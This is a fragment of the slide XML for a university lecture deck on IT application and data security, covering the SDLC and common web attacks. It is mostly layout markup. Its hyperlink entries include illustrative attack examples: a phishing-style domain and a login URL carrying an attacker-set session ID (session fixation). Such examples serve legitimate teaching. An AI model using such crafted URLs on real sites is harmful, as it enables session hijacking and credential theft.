                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FFB37044-B3CA-B4ED-B989-53BF8313892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114BB45-7780-D291-B666-80F5B94C193B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15961518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8E4961-28D7-52B6-79F5-EA661485BB72}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Footer Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DD5DFF5-6298-34F3-1E12-CED38DC9C3C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DE721A4-0718-653B-B382-7DF24E0E3599}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33209038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9BFB7-B5E0-1979-7E7B-2D755F57AD88}"/>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23341C2-7F29-31C8-693E-22E5AD77DC10}"/>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4F1C0B8-C2CD-4988-BBB2-A26AAC217467}"/>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02C001-3B91-03B6-6CE8-9DCEAC57307F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DFB4C501-D4D0-970C-2118-20EA2E61B9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D51F8D-0E5D-6A7B-BE0E-A35409E3AE52}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10249263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73E22-99D6-D72F-DECD-42F6A13C882F}"/>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80D519F-89A5-83A7-4247-57935E2D9E8D}"/>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8323BC4-C7D8-65DD-CFBE-6F1C0220AB9E}"/>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5C39F2-5528-2338-3D53-908AC882C84E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91EF0466-1783-D014-79D6-F53868E880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E4368F-84BD-EADF-E1F9-5D8474580D2A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="156519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D218F-77B6-459F-3801-35C935E9FE2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32DF0B-3F39-14AA-BB5F-316CDC4E70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BD2010-F538-E671-5DA1-F65C269BA2F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7562903B-57C1-5F5B-E960-3D44529716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BFD424-15FE-4E1F-FC38-017A5FCCB16F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4958129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869F4E-0457-4179-C564-967137EABF8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" orient="vert"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6543675" y="274638"/>
            <a:ext cx="1971675" cy="4357687"/>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93748E-74F3-2E67-7CA1-814CAC0126EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" orient="vert" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="274638"/>
            <a:ext cx="5762625" cy="4357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B6726E-C61B-1231-919E-775DDC67F3B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5D9B1E49-38F9-C8BB-4D54-A19FE7C73E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2566AB-A96C-53C1-FF80-2DB35FBEAC77}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{50DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1612692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Manrope ExtraBold"/>
              <a:buNone/>
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Manrope ExtraBold"/>
                <a:ea typeface="Manrope ExtraBold"/>
                <a:cs typeface="Manrope ExtraBold"/>
                <a:sym typeface="Manrope ExtraBold"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Manrope ExtraBold"/>
              <a:buNone/>
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Manrope ExtraBold"/>
                <a:ea typeface="Manrope ExtraBold"/>
                <a:cs typeface="Manrope ExtraBold"/>
                <a:sym typeface="Manrope ExtraBold"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Manrope ExtraBold"/>
              <a:buNone/>
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Manrope ExtraBold"/>
                <a:ea typeface="Manrope ExtraBold"/>
                <a:cs typeface="Manrope ExtraBold"/>
                <a:sym typeface="Manrope ExtraBold"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Manrope ExtraBold"/>
              <a:buNone/>
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Manrope ExtraBold"/>
                <a:ea typeface="Manrope ExtraBold"/>
                <a:cs typeface="Manrope ExtraBold"/>
                <a:sym typeface="Manrope ExtraBold"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Manrope ExtraBold"/>
              <a:buNone/>
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Manrope ExtraBold"/>
                <a:ea typeface="Manrope ExtraBold"/>
                <a:cs typeface="Manrope ExtraBold"/>
                <a:sym typeface="Manrope ExtraBold"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Manrope ExtraBold"/>
              <a:buNone/>
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Manrope ExtraBold"/>
                <a:ea typeface="Manrope ExtraBold"/>
                <a:cs typeface="Manrope ExtraBold"/>
                <a:sym typeface="Manrope ExtraBold"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Manrope ExtraBold"/>
              <a:buNone/>
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Manrope ExtraBold"/>
                <a:ea typeface="Manrope ExtraBold"/>
                <a:cs typeface="Manrope ExtraBold"/>
                <a:sym typeface="Manrope ExtraBold"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Manrope ExtraBold"/>
              <a:buNone/>
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Manrope ExtraBold"/>
                <a:ea typeface="Manrope ExtraBold"/>
                <a:cs typeface="Manrope ExtraBold"/>
                <a:sym typeface="Manrope ExtraBold"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Manrope ExtraBold"/>
              <a:buNone/>
              <a:defRPr sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Manrope ExtraBold"/>
                <a:ea typeface="Manrope ExtraBold"/>
                <a:cs typeface="Manrope ExtraBold"/>
                <a:sym typeface="Manrope ExtraBold"/>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marL="914400" lvl="1"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marL="1371600" lvl="2"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marL="1828800" lvl="3"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marL="2286000" lvl="4"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marL="2743200" lvl="5"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marL="3200400" lvl="6"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marL="3657600" lvl="7"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marL="4114800" lvl="8"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9pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr dirty="0"/>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4" r:id="rId3"/>
    <p:sldLayoutId id="2147483656" r:id="rId4"/>
    <p:sldLayoutId id="2147483657" r:id="rId5"/>
    <p:sldLayoutId id="2147483658" r:id="rId6"/>
    <p:sldLayoutId id="2147483668" r:id="rId7"/>
    <p:sldLayoutId id="2147483669" r:id="rId8"/>
    <p:sldLayoutId id="2147483673"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7CD97D-7437-1036-842F-703324AA27B4}"/>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885E64-8355-29E5-DDFA-C582B5962BE0}"/>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4246CB-98E3-E6C4-1A20-5A68EEE03B98}"/>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7349D043-CE0A-48CD-BD0F-6ED85978C583}" type="datetimeFigureOut">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>24-09-2025</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5AD8122-E87C-9AFE-904B-1E9CD98439F3}"/>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9D0AEA3-0ADB-AC1A-1FBB-839EB520FF5F}"/>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0DB7CFE-38F4-4ED1-AE97-18C51BBA904B}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="253786461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hyperlink" Target="XSS" TargetMode="Externa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hyperlink" Target="XSS" TargetMode="Externa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hyperlink" Target="http://bank-verify.com/" TargetMode="Externa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hyperlink" Target="https://shopping.com/" TargetMode="External"/><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hyperlink" Target="https://shopping.com/api/data" TargetMode="Externa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hyperlink" Target="http://bank.com/login?sessionId=attacker123" TargetMode="Externa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hyperlink" Target="https://www.invicti.com/learn/sql-injection-sqli/" TargetMode="External"/><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hyperlink" Target="https://www.invicti.com/learn/sql-injection-sqli/" TargetMode="External"/><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5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{517B0FD0-3666-A076-B519-6D2FC651B96F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="11113" y="1"/>
            <a:ext cx="9135318" cy="947676"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2EB90EFD-8A4A-B1AC-A380-5E8E3874C66A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="925652" y="1847222"/>
            <a:ext cx="7391400" cy="1143427"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>BCSE-0601 IT Application &amp; Data Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Subtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1E4CA82-9959-86DB-3B88-4F0FDC81607A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3529012" y="3433769"/>
            <a:ext cx="5467351" cy="1709730"/>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spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Arvind Prasad</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="r">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Department of CEA </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="r">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>GLA University, Mathura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1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diamond(in)">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="11" presetID="8" presetClass="entr" presetSubtype="16" fill="hold" grpId="0"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diamond(in)">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="14" presetID="8" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="15" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="6">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="diamond(in)">
                                      <p:cBhvr>
                                        <p:cTn id="16"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4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D4AEA93-B45D-C658-A60F-6ED845F9FE86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="709613" y="1443038"/>
            <a:ext cx="8434387" cy="1323439"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Introduction to software development &amp; application security</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="4000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C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02161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A8538-3DCA-01C6-E722-9B4380FD82E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Software development life cycle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F36DDB60-D759-93A6-6647-D5D62612277C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Software Development Life Cycle (SDLC) is a process used by the software industry to design, develop and test high quality </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>softwares</a:t>
            </a:r>
